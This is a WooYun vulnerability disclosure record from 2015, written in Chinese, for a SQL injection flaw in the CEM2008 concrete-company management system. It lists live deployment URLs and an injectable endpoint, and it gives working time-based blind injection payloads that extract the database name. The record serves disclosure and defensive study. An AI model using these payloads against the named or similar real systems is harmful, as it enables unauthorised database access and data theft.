{"id": 29653, "wybug_id": "wooyun-2015-0118675", "wybug_title": "CEM2008混凝土企业远程管理系统SQL注入漏洞", "wybug_corp": "北京鼎软科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-06-09 16:00", "wybug_open_date": "2015-07-24 16:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CEM2008混凝土企业远程管理系统SQL注入漏洞 详细说明：  存在漏洞的是北京鼎软科技有限公司开发的CEM2008混凝土企业远程管理系统官方网站：http://www.dingruan.com/产品主页：http://www.dingruan.com/product-2.html官方部分案例：http://www.dingruan.com/case.html案例：\nhttp://www.bjzzjbz.com/Login.aspx  北京住总商品混凝土中心http://118.125.106.216:88/Login.aspx  广元城建http://220.189.233.18:81/Login.aspx   德清城建http://www.6years.org/Login.aspxhttp://125.65.92.216:81/Login.aspx  安县界牌站混凝土\n漏洞详情：\n/AjaxRequestPages/AjaxGetUserYieldStation.aspxPOST DATA:判断数据库名长度：LoginName=abc')); if(len(db_name()))>=7 waitfor delay '0:0:5' --%20LoginName=abc')); if(len(db_name()))>=8 waitfor delay '0:0:5' --%20判断数据库名第一个字符的ASCII码值：LoginName=abc')); if(ascii(substring(db_name(),1,1)))>=67 waitfor delay '0:0:5' --%20LoginName=abc')); if(ascii(substring(db_name(),1,1)))>=68 waitfor delay '0:0:5' --%20\n   漏洞证明：  1.判断当前数据库名长度:a.当设置数据库名长度>=7时，页面存在延时，即判断条件成立\n\nb.当设置数据库名长度>=8时，页面不存在延时，即判断条件不成立，即数据库名长度为7\n\n2.判断当前数据库名第一个字符的ASCII码值：a.设置数据库名第一个字符的ASCII码值>=67时，页面存在延时，即判断成立\n\nb.设置数据库名第一个字符的ASCII码值>=68时，页面不存在延时，即判断不成立，即当前数据库名第一个字符的ASCII码值为67，即字符C\n\n根据此方法依次可得出数据库名各个位对应的ASCII码值67 69 77 50 48 48 56 ，即数据库名为CEM2008   修复方案：  对参数进行判断并过滤！！！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}